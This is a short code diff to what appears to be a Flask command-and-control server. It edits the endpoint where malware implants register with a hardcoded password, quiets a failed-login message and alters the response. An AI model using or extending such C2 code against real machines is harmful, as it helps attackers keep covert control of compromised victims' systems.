@@ -11,17 +11,17 @@ password = "foobar"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
+    print(f'REGISTERING A NEW IMPLANT')
     register = RegisterImplant()
     req_data = request.get_data()
     register.ParseFromString(req_data)
     if register.Password != password:
-        print("Invalid Password")
-	abort(404)
+        abort(404)
     r = make_implant(register)
     db.session.add(r)
     db.commit()
     print("Watch out sexy ;) a New Implant connected!")
-    return "ok"
+    return ""
 
 
 @rpc.route("/checkin", methods = ["POST"])
